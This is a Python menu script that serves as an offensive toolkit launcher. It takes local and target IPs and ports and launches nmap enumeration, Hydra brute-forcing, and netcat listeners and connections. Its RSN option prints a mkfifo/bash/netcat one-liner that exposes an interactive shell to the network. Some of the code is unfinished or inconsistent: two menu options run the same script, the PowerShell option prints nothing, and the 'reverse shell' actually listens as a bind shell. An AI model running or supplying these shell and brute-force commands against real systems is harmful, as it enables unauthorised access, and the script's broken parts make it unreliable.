from enumeration.nmap import nmap
from terminal_management.tman import popen_command_new_terminal
from listener import pythonListener, netcatListener

local_port = ''
local_ip = ''
target_ip = ''
target_port = ''
def set_local_ip():
    global local_ip
    local_ip = input("Enter the IP address: ")

def set_local_port():
    global local_port
    local_port = input("Enter the local port: ")

def set_target_ip():
    global target_ip
    target_ip = input("Enter the target IP address: ")

def set_target_port():
    global target_port
    target_port = input("Enter the target port: ")


def main():
   while True:
        options = [
f"""
            LI : Set local IP       {local_ip}
            LP : Set local port     {local_port}
            TI : Set target IP      {target_ip}
            TP : Set target port    {target_port}
            Enumeration:
            1. Nmap                 
            2. Custom Nmap
            Bruteforce:
            3. Hydra
            Shells and payloads:
            L  : launch netcat listener
            LC : Connect using netcat
            RSN : Print Reverse shell script using netcat
            RSP : Print Reverse shell script using powershell

"""
       ]
        print(options[0])
        choice = input("Enter your choice: ")
        if choice == '1':
           popen_command_new_terminal('sudo python3 enumeration/custom_nmap.py')
        elif choice == '2':
           popen_command_new_terminal('sudo python3 enumeration/custom_nmap.py')
        elif choice == '3':
           popen_command_new_terminal('hydra')
        elif choice == 'L':
           popen_command_new_terminal(f'nc -lvnp {local_port}')
        elif choice == 'LC':
              netcat = popen_command_new_terminal(f'nc -nv {target_ip} {target_port}')
        elif choice == 'RSN':
                print(f'sudo rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | sudo nc -l {target_ip} {target_port} > /tmp/f')
        elif choice == 'RSP':
            print("""""")


        else:
           print("Invalid choice")

if __name__ == "__main__":
    main()